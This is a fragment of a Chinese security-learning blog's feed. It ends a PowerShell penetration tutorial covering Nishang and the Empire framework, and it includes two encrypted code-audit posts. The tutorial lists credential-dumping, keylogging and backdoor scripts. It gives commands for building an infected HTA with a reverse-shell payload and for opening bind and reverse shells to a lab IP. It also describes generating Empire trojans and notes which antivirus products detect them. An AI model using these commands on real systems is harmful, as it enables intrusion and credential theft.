class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> Check-VM 这是Nishang中检测目标机是否为虚拟机的脚本。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> Copy-VSS 使用卷影拷贝服务来复制SAM文件。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> Get-Information 从目标机上获取有价值信息的脚本</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> Get-PassHashes 从目标机上获取Hash密码的脚本。</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> Get-WLAN-Keys 从目标机上获取纯文本的WLAN密钥。</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> Keylogger 键盘记录脚本，大家应该都熟悉。</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span> Invoke-Mimikatz 在内存中加载Mimikatz，Mimikatz大家都熟悉吧，不作介绍了。</span><br></pre></td></tr></table></figure><h5 id="5-后门利用"><a href="#5-后门利用" class="headerlink" title="5.后门利用"></a>5.后门利用</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> HTTP-Backdoor 可以接收来自第三方网站的指令，并在内存中执行PowerShell脚本。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> DNS_TXT_Pwnage 可以在DNS TXT查询中接收指令和PowerShell脚本，并在目标机上执行。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> Execute-OnTime 可以在目标机上指定时间执行PowerShell脚本。</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> Gupt-Backdoor 可以从WLAN SSID中接收命令和脚本，而不用去连接它。</span><br></pre></td></tr></table></figure><h5 id="6-客户端攻击"><a href="#6-客户端攻击" class="headerlink" title="6.客户端攻击"></a>6.客户端攻击</h5><p>​        Nishang中还有生成各种危害文件的脚本，它们可以生成各种感染的文件，如HTA、Word，来执行powershell脚本。可以神不知鬼不觉的发动攻击，由于各个脚本用法相同，这里以生成受感染的HTA为例子。</p><p><strong>Out-HTA</strong></p><p>功能：创建受感染的HTA文件，可以执行PowerShell命令和脚本。</p><p>用法实例：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:<span class="symbol">\n</span>ishang-master&gt; Out-HTA -PayloadScript C:<span class="symbol">\n</span>ishang-master<span class="symbol">\S</span>hells<span class="symbol">\I</span>nvoke-PowerShellTcpOneLine.ps1 -HTAFilePath C:<span class="symbol">\H</span>ACKER.HTA</span><br></pre></td></tr></table></figure><p>第一步：我们先来创建受感染的HTA文件。在下图中我们可以发现成功生成了一个受感染的HTA文件hacker.hta</p><p>第二步：先使用nc来监听端口，然后运行受感染的HTA文件，可以发现成功反弹Shell</p><h5 id="7-powershell交互式shell"><a href="#7-powershell交互式shell" class="headerlink" title="7.powershell交互式shell"></a>7.powershell交互式shell</h5><h5 id="基于TCP协议的Powershell交互式shell"><a href="#基于TCP协议的Powershell交互式shell" class="headerlink" title="基于TCP协议的Powershell交互式shell"></a>基于TCP协议的Powershell交互式shell</h5><p>Invoke-PowerShellTcp是PowerShell交互式正向连接或反向连接shell，基于TCP协议</p><p><strong>1.正向连接</strong></p><p>目标机运行</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-powershelltcp -bind -port <span class="number">86</span></span><br></pre></td></tr></table></figure><p>本地nc连接到目标机端口86</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200720163135.png" alt=""></p><p><strong>2.反向连接</strong></p><p>第一步：使用nc监听本地端口86（注意必须先监听，不然在目标机上执行脚本会出错）</p><p>第二步：在目标机上反弹shell</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-powershelltcp -reverse -ipaddress <span class="number">192.168</span><span class="number">.157</span><span class="number">.138</span> -port <span class="number">86</span></span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200720163923.png" alt=""></p><h5 id="基于UDP协议的Powershell交互式shell"><a href="#基于UDP协议的Powershell交互式shell" class="headerlink" title="基于UDP协议的Powershell交互式shell"></a>基于UDP协议的Powershell交互式shell</h5><p>Invoke-PowerShellUdpPowershell交互式正向连接或反向连接shell，基于UDP协议。</p><h5 id="基于HTTP和HTTPS协议的PowerShell交互式Shell"><a href="#基于HTTP和HTTPS协议的PowerShell交互式Shell" class="headerlink" title="基于HTTP和HTTPS协议的PowerShell交互式Shell"></a>基于HTTP和HTTPS协议的PowerShell交互式Shell</h5><p>Invoke-PoshRatHttp and Invoke-PoshRatHttps是Powershell交互式反向连接shell，基于HTTP协议和HTTPS协议。</p><h3 id="Powershell渗透框架empire"><a href="#Powershell渗透框架empire" class="headerlink" title="Powershell渗透框架empire"></a>Powershell渗透框架empire</h3><p>​    empire 是一个针对内网针对域控的一个渗透测试框架，和 msf 类似。其中集成了很多内网的一些工具以及命令，使用方便，且 empire 生成的木马文件基于 powershell，所以在 windows 平台上有很好的免杀效果。结合 msf 使用更是如虎添翼。empire 安装下载命令如下：</p><p>安装后，在其目录执行./empire 文件即可，打开后如下图：</p><p><img src="format,png" alt="请输入图片描述"></p><p>empire 包含三个部分，一个是 modules 即自身的一些模块，一个是 listernes 即监听类似 msf 的 exploit/multi/handler 模块，一个是 agents 即已经链接上的会话类似 msf 存的 session。</p><h4 id="0x01：设置监听"><a href="#0x01：设置监听" class="headerlink" title="0x01：设置监听"></a>0x01：设置监听</h4><p>​        使用 empire 首先设置一个监听，输入 listeners 命令进入监听模块，进入后需要使用监听种类，输入 uselistener 加空格然后两下 tab 可列出所有的可使用监听类，这里我们使用 http，随后输入 info 可查看吃类监听的详细信息，如下图：</p><p><img src="format,png" alt="请输入图片描述"></p><p>​        这里需要设置下 name 参数，随意定义一个名字，例如 test，然后另外还要注意下 host 参数和 prot，即监听使用的 ip 和端口，一般默认即可，就是自己本机的 ip 和 80。设置无误后，通过 execute 执行，如下图：</p><p>ps：listeners 模块下通过 list 命令可查看已经设置的监听。</p><h4 id="0x02：生成木马"><a href="#0x02：生成木马" class="headerlink" title="0x02：生成木马"></a>0x02：生成木马</h4><p>​        设置好监听后通过 back 命令返回上一级，然后使用 usestager 命令来指定生成木马的类型，老规矩，通过空格加两下 tab 可查看所有生成文件的类型，这里我们使用 windows/launcher_bat，即 windows 平台下的 bat 文件，同样，通过 info 查看此模块的详细信息，如下图：</p><p><img src="format.png" alt="请输入图片描述"></p><p>生成的文件类型大体有三类，multi 开头的是通用类，osx 开头即 mac 使用，windows 即 win 平台使用。使用 launcher_bat 模块后，通过 info 我们看到了参数信息，这里需要设置一个 Listener 参数，即监听的名字，就是我们刚才的 test，设置后通过 execute 执行，文件会生成到 tmp 目录下，如下图：</p><p><img src="fghjfghj.jpg" alt="请输入图片描述"></p><p>我们打开这个文件看下，可以看到是 poershell 命令，然后通过 base64 编码，如下图：</p><p><img src="sdfgsdfg.jpg" alt="请输入图片描述"></p><p>这时我们 back 返回监听那一级，然后等待目标执行我们的木马文件就回得到其 shell，这里的 bat 我第一次运行 360 是没报毒，腾讯管家也没有报，火绒有报，第二次 360 报了，其他类型的文件有时会报，有时不报，原因还在看，大家下面可以试试，我们诱导目标机执行后，就会得到它的 shell，如下图：</p><p><img src="gghkghjk.jpg" alt="请输入图片描述"></p><p>这里我可能多点了一下执行力两边，我们通过 agents 就可查看目前得到的 shell，随后通过 interact 加 name 命令即可进入 shell 中，name 就是 shell 随机给的名称，进入后我们通过 help 可查看一些命令和一些提供的内网渗透常用的工具，如下图：</p><p><img src="dfghfgdh.jpg" alt="请输入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Powershell渗透学习&quot;&gt;&lt;a href=&quot;#Powershell渗透学习&quot; class=&quot;headerlink&quot; title=&quot;Powershell渗透学习&quot;&gt;&lt;/a&gt;Powershell渗透学习&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;powe
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Powershell" scheme="https://shu1l.github.io/tags/Powershell/"/>
    
  </entry>
  
  <entry>
    <title>songcms代码审计</title>
    <link href="https://shu1l.github.io/2020/06/28/songcms-dai-ma-shen-ji/"/>
    <id>https://shu1l.github.io/2020/06/28/songcms-dai-ma-shen-ji/</id>
    <published>2020-06-28T08:52:42.000Z</published>
    <updated>2020-11-25T09:02:09.714Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b05d2c36b0030d640a5d8bd82da8d968c19d0afa70e7d3c99fd7e65228ef7c2e">e005edcb58d936b244a322ddfeffa6ce7ae2a1c1f03e47d5b6b1c042d0c6bd0ab2cf7e734ae52d6aa441e250f3b5653ec92d95574e0deef8d8b6a3293c63e2e4d6b128e866380a6bef5567999ba3905ae20452aebd3b6859bf842029f117f6648cede300f3b689652f11114e2e15694c940a6dae56ed978f478cb881f3aa8a782fa6e88547b3bb2dec85c4480e2851961cf950ed840f4cb6b8704b374b027c74a6fd91e59002e6d2e583c64e3ed1b30bf1e132e1ea936037369eb56cb1a0e9dac80f7ddfb37f5d311a2b6206d047136836df069a880de6295951bee85079b061f77383b989dc64c017f727d113c4c1eda384ced79bfab3cb4ca2b6046a2aced07c22fb1a968e51a3242a67199e24948d16388df0557d1fdb9b0bcc4ec4acd2e7cf0bfeb76e634ab1552679b86a8c7fb4c6af4b483753691934bebbde987106dd8e9c64f81aee1cf89164f4e8e5180bfbd7bd5f390f17abe0e5d55f987fea706e57713ca91245b1b618fad7db25fd8b3e69695ff6129d06e4b9db638d3a37354024ab828bd5b0896c4acbebb4abeee973223e8d89930327d4ebef1337d2e1e49703059de1863d9b3172f4b71f1f89b9bd600e1535442c5308b05abdb4742f413fef9e4f1a370d2efe769d7e949ea7a55e436d52da3d89aacf1d04e6fc3f55cacc26c451fcf387453f69993ed73ad4f222e39022b52d4590e40a309339609d61ad53f70a92efdbec9f2995cd21bab98f6ab11f7815b1ef4b496025b7d51b090bc59652bb1e14cd0625acc8c0d14e2822c1d2ed450388b731f28f74297bc10bfb72570ffed24759103200274bc90738f2c7aabc8c4dc52557f71af0bd28cce7f6687d82fb225a46cf75568850131b8ffdd76e912c0ee1750e6d13619833c0ee473206f8366fa3f49eb4bbb6561ba2a28aac966d1feb482f621556def79fa80845fa7fe71b14c4b70e6e82aaf5de5fdf702616e52348cb4ad70196df12ff63fc919cb8a97be1405e853b92407b48b9e42318d78c25167617c1e151ee72652eacf12ce114a74f959b7674f05374756bc91a8f689aedf65b9e5607ac8106c838487cf8765866830b8c46d85aa6e56fe36e6fd9210e933a662d836ce69fc446fd49653982be67c163b749ea2ffb4227c8f497c00742a3a1b125f2986b817f6eb41905d6966011e56f5fae0e3768bb84cbc4dc983fb40e30113f6a825ead9d81209f1e24250997db812e8aaa92aa9a9babf37cedaa14a3b6f287ff6ebc97936c902e5c244d577edeada587b025796fcf311e07abf0c7528e367f4cdb22c9dbaf21f033bbcfe81129a575f39170b0e53faa3f1b1c12f017249a83e228234b5906bad62e623f7374164fe851796942154ce18c50cabaa7347d3200366377e20306481fbd7580e92a7e73ecb98a9f0883b6fff9bc7f000b9e2e4b168b9f430bfc95fd4d7b4d6f7527f73d3578fc5c1a36702dd2e4f0b68abf15f3c7865037f7e7bb645992ce0255a1161a4dc61c37b00540757923a49f5310b4c36852e429ad7bd3c9c8f15be2ba952cb25dcdc077ae042a136966299d47bcb9c8f2943504c142b9255df75cb13353d6b40127e021060447699437b384304d2b5414da26e4733c722300edfc0d9a339506f0830d9c3681b9c5215e3ba34b0a7fb454610ba335efa5aa34fb0392e7c520495ef86c4fdaa3c223315711dc132036fb8ad664b2624628e1f6a769258c07ce4dfbd5f5b43c7038be7b4891bde5439a2ecd0a3bdd1951f50038d62089baaead3c7d16ec1cdc2bf6e648f64d88e39ae418ed8f17d82c0301977800554adb1996bfcaec3054b5324d01ff84410c6399b06d00f1213e2cda1b3d0464fc376e95f83ae3148b03e5d56ac50707181470a3cb688c76725d2dc2496a909c4b80bd3cb0d9ea64f473f53ccca4affb4f58cd64343a450a7834c3076c57d8469ab3cf6615ecb0c70fd026b9bc3f691b0f38a8eed2bd25cc52a7653a2cf73c731207cdaf56d48947e593663a9dccc14788ffaa81a73d655b602fa9e142394a4cebbc5cb120f5d556e1ca95660156a4807d875154fd0f599a65e7d8998c29328a5991372aaff14e5eac2f35afce47751d71f6f7df917fd67408189f4dc3b2c3ce30cb564bc9a94ec536ea2f4dc65e78bb4e32f7b4931f73f840a84656c076900aee565eff30a42adeffaac8ac32edf22c2a26e7bbc3cd0ebf57a3c2fe4471a01ed3989bebd823036549ffa4a593d57c0da6e01a8bb20384812a0503a41e187fe45bc8a91414b712b655cf2fc57fcbaceff5d05038057d6cde53a53d8aca03427ca1cb723cfbec63ad48ed73cad0cff756d36bccc5458cff5b91cb205e6b05356c23f17f32b906c289e0489de3227d195609110906f30f72d9727b769d4da277dc966b2d9b68434b796cdac4b15df433342ea2870524125bd370dcd6818a4aa57cadbf9212157b7b1b46bc985deac900b3a42f57f9d90c163ded7128b0d71e38c25410190ad9c68ddf3b4ca6fad8ab65800e8a5a83786caeb27cd01bb6d72f8ced56bb38330d0201b2d4363562d1f4838177a1ef13ff0274cf92a4ce9aeb163513f5bbc503a839581ef434547e759f05fe7692bfdb9622763df43154b3d6acc6e63de6c7a2788efa403a45287633c1d26f76f96759ca3a5d124e17d8e46e8e08696ed21e7cd5564ba5b5445c9f5e2f8d0f88ac9d3a2ce91cf49802c88bb42b78546e7ab6403d7990d2c8329bb210a811a94190b0f5c81f235659cd4ac5555c54d4be3a323d0003113a8d08b07e5a160e8699ce7d8c7f19c257daa49a6f7705ea3a0969c4430c163f9f24ac21494e8a594b951f7c3461cd923ac866985a99f02ab424c310e4332c7de4e6667d888582581b8ed37c286d32eeed4d183fb6e7fbe69103aa1228187a2542739c0db5ee7112307da4c15ad3087bf8c075036f46acf2c7c37fba85651423eb2928a13de7a57211b254a024917a5d917c66b8463670c4a4bad1ceccc301a575fddfca1e3bdbcd33bdb5b7442252e623a64243591a30769cd10cbc3a030d7255ecef137d2f329a0049a957cfb4c8858c7a35d32e9b4c5ba0100a60b20857569dd487d07de447440ee5942b4320b49cf51b3fc6488a82fc603650baabc19f98aac88fbf23cb438746a92482baeb44eac229e56d2348c655d699cef148455a84c68ffa2fd675eaec575bacde8b32f7a85cf97b0a87c19178a42a54f0f4711b313f569d8982b9991a5f0f11d074464e8212e016a6135090632382e9532b56c1fe7d94e6c524d91a8818b63c20846aa34437d69f88510c74a490ad76caf06a59ecb4548b68303d1b2f653f7c33d538231998311321099f98620e934801739a730058a3e2b9abe28c532817d1024032131003713a1f46f75749d2a9a7c513491b25329cca3cb0ab56ddcbe8483ab5bcdcbb0bf27fdef0fde977b9b6333832c64ad816615868fcd8bfafa7fe25fedd1a266ebb98a0098bb3f0003c7fbbffd1667b6c7a755c3afd5082f76a19cd1136a0275077a88619ad5202a49cad2930258f29391895f8cdd8e861ef3b963941746151a0ed850264404eb29bbdc523b7da89655a92becd82098ef4e8f8b1eea93e8f35eaeac46d4c81d99f2cb6b8f8c295228bf38103e7c80c9aae646307af3fddfaa4de4fcf60aa5dad4da8fc11365963513ccd451bd7ffa934ccce2938bafc69047348a0bfcbb72a7f144aece596c72ecceb3647bc2e701d134d067365fc32d40adae341c42407fe75f4df9556bed516e3b1e7eaf27675104044e2ebfba1e2af80b371d12759c3c9ec3a133f45f75a038ce7c362dc1d93c62e2156ae8d63a812ca5a41f61578058a10a2781c6942d58e77b4d04831804c0771a1606bb99c377301f75ad2e6c42a3396a9622e56e246e8df865c226c16fb09bbe3bc39313f95ec7709db8c0bfaa84be343673715fa9808a7b09be9bc6558f29ad4519718c17cd8f63c4b73a44dee7f63f625bcd70bde67f202d483e52793efff5ca9e9265beefec061b79255eab3a9ad12bb1d6263fc63baefedf3fc79a510001b32611aeda59d71d7c7c5a5d23c48bae63d7e926b25d9af0ab779e6b9733b4df52148ce562f4993bfaf718d267f0ddc31a9f76692a8edd9b3a765a94e69e2dccfee78c29907bf20bb10d02707190b21f40030fa942614dabfe89f38174a6d5f54d3fcb798eaefa25617641b72cb2e7e65c2e359d580a8dfd0b0da5d420f3ab17e01e63a7509cfd7aedef3c02bb75e060c392d54b7beea33d9433acbc82107a55964de25d70fd75ab181d6568e51f3079bd2ebd63627099dbe553b7f5a51a7711941fb773090acdd22ecb8c9b21cc06c3eec7cc5aa8f0d4a82e97d60a7312f89ae5f2e5353a32a80ba36438184ca7924b2e92b33ca39db39f4106f24a7b3b281ffc5b38b339b6297db1db5813199818b369f0f1ed2f5687776f1371fb8494c8c3f7da07d96191513f44c5e707867b7a2ec49e54758ee3948277e81bd200ed76d1fa11b8aca698ac878b629ad31af8a137024e88e3dd1f658a3d481b733fc0b96f399cb11dc8f9bdfe90c4482bfe73b933582cf1738a022799959e3aacb8078ec24dba112bdec347b209345d891657ce8b54455ae6cb7d30afa132364e2107d589a335a6d4f8819fe8dd8392e9191d3d5ba37f0f3b59721d72606b884d6e51d018b86a5031ecaa8f775f62878e968f972855a179f2368f25385870848a43a5958b3176daceef6bdbf8232e09c6e46913e31178b19d388551d3ed848b1eca910661a1b9dbe4b902325be7cfddae5204538e01ddbe1b46b1124d8c39aac7d1f607a9e3451a5176c663231e3a71cf00742049f2cefc5f38fd235c71b625ba8c070f77c08a8ac879a591b4e77743c0a8df63a06654cc0e11b181ba9f236c8fe3b9699e8f99b9d2983793e38fba1b8619717819c64f19d44bd3d6e65d57eb37dfd981e1842b94db42c3e96b5b3d233e222b7c1c68c772680928380a4f8266bad1d935a4ed0c01f2c0d35e69ff18d41aaa69c885da3f501388e32658dcee9f83abdd0084c7608f953bdc9ab9af74bbf3e8fd9171eac35455fe33b9704fab8f8da97403348e48bc99157b22cf38e2ee8d2f06fd5629ae2be471317a21601c74c81e593661a93d4ae6885a2707767da95bf6a7625d3d7d8cc7b4f2e7092f9da66e0a53a943917398d6dd2d91c59c527157b23100c0284b9d744e68d9bbe591340679a12203233e0799d165efc96d63bf014b3daa3abc31bb4ec87460d24bcd53777581bb86b5a852cfc125c3aa7c371057a2b6e7dcd467698d69330620c9a056e1e13446b5e8f59bcf35ee4ca672973230c197481fdd9d8f680f6a07e0a9f6ba110a1cd0741c932476f26d84eeab31f87003d6f641f459e2e1e31a72779c48cdaae7ce0d03b2eac8e765802ec7663962187c4a7f39cb28c463664c3a49ccafcd8269c812a02e5edeb55a61b39e08333ee5bfec1b5ccc358fcd366ff49e024194bba6cafc6ca6c0866c16ac1470eb6fa986bae4b40da4bb348cfa188c3f0e579c439f4248874a5b40e52023a1d59fdd45d11a3f6b1bea3d84dbcf82dfb075de3af9aa2894235b00ad8f384d64ad3a54c07d2d2ed6facb4c5672779b0790b587dfd1ce98b1220f8037ee2fde766dee7b5280d13fe3028a686dd2d5df028e1eebee96083621220d080253e035137a5b88726fd20a6a3114c138722ce737aee0982c3e71328435b108581424c11a3cd42aa5559b4352da5c412ea5533fb3d07bc2aea5d58f5beb86a9e7c2b66c0a23b3fbdd22a336dfe669278c0533563ca9a3cb878229671f100047dfa0d5d5a67718938b3f64740c3351ec7550b82dc36fa8716a3c6ac160f101f1d996a20e9904e5bbfa8360e15af01e3c7318f2a40c9029f7cab9fcf6070190d289328b3b23dc319fd8873507422a4ad67b40080afca8f3d83a3bffcbb85161b0e4d98a66ffa6cd25630ef4d2d0b5c5577d0b41719c892b1bbb9469d0dd7f4192f14dd99f46d2164706a4d5f2b0d6ac1b0d5a222e740e125ba438ecdd892d19e5c0c0beec880d043c351d5eeaffb2fcf6ab6d117d7ef2c18040de7723821c1baaaccea80034cec17c9786c34f8bd1886157d9bc4034028830d38c9704d5304e56e369aae5731132e15a6bd6d29095e5ada698c8b1aa70abf3de140643bae09ed01000427012139541fe69191364a2e0bf8f02cd8180d4109f5bcf88871ced3ba2c54362ef1d654c8ae79cab8b26287a399771286e7775273bbdaf49198b3ee0d412a4ab8659961bd1e2d3de684383de0857746c86385adab228b7c61ff778fc0cfbeaf801ef837eb968fbf9637387ffc02ec71a163c824bebf35b8fc5c39e81f4dafe8cd76156227cbeecb0335bfbe72e666123576a089c2a1267f0422068323f6c0d85088f21c3c6d3970441e92f737d2326373dcb19f5e04aba82f0ad8e8c1a359b38bffcc910082ea65b54b930bff83eb51f238b5ccb8f1c3557743a268604fa2037e5ffa3ad62ca0c7a0d6c8f38b970204e6175642b1ab94478bbd6de07373d7fd67ea7ee025e8a3e18681887489ff9fc94042f8c2468fe5f5289925f6c2a9a0b781b7a2825fc80d2ae41303e6c394a94f06c41c0a0ef0c972ccf8b18ce39b43538e331bc01504fcb7a6215f6d74281f77272e43b4137bf8dd40788e025c4127da4e2fd3e53ca3387292834193b14ffe69b01caaf3dad5cc2e3850d3e67ed265940a9412b9b662eff9bedcf40e4fb0c0a34673513cacd0c525373eae42001bacf5cdb6ab9955d87738a2d743afa43633edef488094375049aaecbe80a734bb19e54464fb0ba6907213351f5ab97db7f94953798e84a580e98c55d35ff1301d0a322391ab77fff4a64da06da9091b9ff540b7281bb68e671a849e8ccd66bd2326b32aee8d956bbe372f75ee9d4b95136cbaa9f3515b90642f65d39f8936694cc5b9538d821dcb51dcd9f099fc6c1327ae25a04f7ea6661fabcb8e118294c64af0d5f177b64b3090275a83471f0149174489e67f27cfd38606e6f62517737a4ec6647a4e4aad1981a2e6cea5d45a8f8ffe1049b40f0442c3599cdc11f0974c778095ad71c62cabe32a996844591da35dd178b31a23387fea3058c0b49f34e7a56871ebf5fc2e57becd62ac64d0ae496f9b148734df3c47eabfeb00b55d426299f43ef5c2c7449e022f911f14a39e28e6825d92ea546b5c4bf72c8865abb46d325b7a37d9ee5ed325244fb84d7ef0cc8200690ef7b360ca5bfe9fcd16c5d3ff8d41ee09d93a66f30be13b67ad0e6c57aee2450375f8aafea83ca51f6804a0c04c203dc5b2b9fad00d927e052c79316ba24df2dd8a0c714674324573173da2719dd51853aeaf4599a98d48ed0530426653c3e4429251c8640d22bb662a5f5583b84b95ba8c676c4d0a49f2873213d4632aa590c5aa10d4957df5a017cda6dfc44b7a85f6c190e672f0e98827ea4d94b4015ff15ed81acd8a699d5edb6623ffb9ef35dc70c2e5eb3b73542d3610cbda5f79e4d9f0bb6adcd9c94f99ad552e47dd72e298a02581b8547bd1e7743e59ae41b0fea37e7543de3c3bab38ee4bbb34d2fe51696c2e3b82e87372e664cdd3707a833b194da1eb30ac9c819c1b7c5a09bcfc3184eba717c149dd3338649fa3b400d3decf467fd00a97e11c2cfffdcfc93951d5a5bf94c27ee267cd6df381a601f0869498fdfe0cfb2b4eb83e968aefe5a95ce5879d65e518c9b0757deef491e7729be946f8bb9a105c321b3d7b814c61302da5d19d1c6ad6d21f637c83c91803706bb85b7d4957f9a4209445c5ac504100ab2da4f621394919d8cab4deeff14037b42e4f74112789ec4dab37ebafbb5c962e0336e3fbd459b8a55fbe1d69a9ce6a88542ff8e29a0ecddbe585d86b44ca9e083ca7e5a03cb0eb9f857a28ff43e6addd73eba1ae9bc317952e529163bab9cd544991eb9c7c16e18a4f00fb11dc065e424945f760b17554c4d09e89a0605ad3bf1d8f44f2410f7cb3398f71078fd67d268c75605626122db7bc9556152e2bd02758797a1d1e607bcaac2c2886b3dc987390ffe5a7fc09ac6ee129799403c163cbe60eace7dfd844eb39eed69c01849839a78db4e1ac753d72045a14236cb5faeca710b5ca47c284eeaa31a82445b92f5591faff5ac35ba0deb30ff1015901d1575f577a951ce7ccf702ac6f90967d7d4e34ebf4ff10fb6a3f84b38a246ad19a90b0e762c951e96d197c2b43d4905fb5be9930f7212ad04d9a89b331415cb8d9fbf22dc1cf18ba12e83ecf39037bf34f766e2d0cca55e14ee676a5e90f722cea8cbf11a2f82eed1f5eb2bb865bdf4b6ed993be048564be6a9bf5df544036d1256fe30e89d56ae52046434d65933166e4bcb0981332362a2874559685745ee73c4a4d844b36e21fb2391a1fee4f9cb163a3625a17f6c8b440fbdfcc871368e947d7c680683490d3af0d4f5a1c69875f1b62331dafb418c458641c5782d8b279045025764fa06e92182bed75a2b3aa402d08a86a585f2a87c9218ac185b6ba5eeb73fcec4f1d74674f9e55f0920eb496aa7040e6df889b070affcf4957e8593ee3b0a29811211666845f800efc2b9e9afe0443ccfd6093b204abd6fe0634da9bcd3a7c6cb1ac17131bdbe9580c8e7993e66de5a0d339f3c5d285faa9cbc5b94e0514e8817a99f87c538fff484a3501ddb44a33d67e0bb566366121a4d6e2ddd1768f011307dfd26ab26d8355d8409d9f89c9ca9ca2a7c7c3619011516fb4f0b26f29fd6cd5d6e0d5d2f40580a6eb9ad6b906cb7eabfc2e7e01ef15b7155e87e2319552e9edb47ccd6be87877de39412942fb2f403337248a95af02ac42c95b52617560dc808dc58f39e04747a742c9eaf83a023ddff9103eb3b6de889609af82983cf0190da89a58a02a89c0c26d788baa92a0b44944bb804e21afbaec767a6582371923fa84775d34a58041b0c0a2a39432b869d76c7f89e708e4bf48cb47f6e059cd1db3b5bf205ffecf4655e325b5bd3c7d626e42e5fa480f0bda677929755be560c423f6915b886c7541492101781910129a40be9e2428374581cd9193cab36e167a46bc4c2e0039ecea68efb762fa38f136dd0f5868f92f909bcb3fee45acd40094760acdbdcf76505b512793042808ca381909ebe7740048ff4f492bbe5259063ff9eca474fa44bb310355c7e6b9bf0f8dcb260ddfef68a1cf82408a90bbfd93927ab9495ac3abdac1fb872d4df1c0294ffe070f46c9884f4d6d87ba80c50b18fbc0b24597e47eeab2797f85872f8394ad7cd0b6cd2a92ea6c3d4bd00ebf3fd68c30d3c27593a3bb4affc02ca21602651d4671de20aaca8d9e54bbacb77243723be3c037fa8e025dea284c6c6adde554bd2e275a1c33edae4b0fd9ed9205ad73fc6367b904e8039d1231aad8f87c0fca9b8bbe09ab9fd8b10a22ce0a41c3decd65d08687d34b3f22b6240de77c57430b92803b5dc05914488639850fbe8c2e3dce431276d0e436e3fceeeacb804ca8ef718556b2a351de43fcb22183412274fe5a1fb9c7bc267dda6cdf8f529308afb707a836c478003ccfc3411f69fb085e4437d7a8ef96054c57394912070bf45b9d6114947f47c9f3ba04cf2de207079ce7be5193d99dbdd53f9f2d063730d649791420497bce4b762fa355d6332fedd3009a02248b8b39f87e2433fbe19571d2b37dba69c87b56ac42301b00bb47c81c82cb9446a627349726155cca91bf02283113986724288d34f56bb398501532c38c53dca9581ea1f32cc7cd53d947e9378889b38d5280220fc847e8f791f173ce1e7d66e2c5306d38eafb833530306f2850a25bd0e9140eb85df7a0eb22ea016abb3a2f61fa4aa39d0eb4379368ed257fe5015bc20df8315999927ae13c46c02d2a8df4f780480d684bab5882e59dc3826bcbce11242e50988c6e68e0ff7390b5638394fa9845b85f6ffc4928767ec39fbea07b5c4fe802e3787afaa46cc9029c6185f814618a9cea550d1933a4ba218c11aafc8ad0757a1fe78ec14c28e77a9a2c3a0411421b15e3b837e697d6db35d5443edb5bdf8dad548bd796d510efe4c17e14b72831f93d217bbb61c16a83beb9065e43e25bc90992292c57fa41c6b9db6918d39e057f285ef3a45edd9d41c3610094b8ff3f73479dd4dd3beb1ddacb94bf0041ac86d3527b308f12da166ed6298b78c67feb59582e2d78aa55b7e1f869eee6b5511aff38ce5e3387955a45b33064cc5d88f1d3f48dbef07adf9cad8bf630fdafee2371798b532d74aed652b644ac</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="php代码审计学习" scheme="https://shu1l.github.io/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="代码审计" scheme="https://shu1l.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Jizhicms代码审计</title>
    <link href="https://shu1l.github.io/2020/06/28/mou-cms-dai-ma-shen-ji/"/>
    <id>https://shu1l.github.io/2020/06/28/mou-cms-dai-ma-shen-ji/</id>
    <published>2020-06-28T08:52:22.000Z</published>
    <updated>2020-06-28T09:27:21.815Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="91270d06592d4284604580f4a44befa04332c411925c8bb938910048897a7453">fe040a29e7dd22b4e0f1dcc4236675aa</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
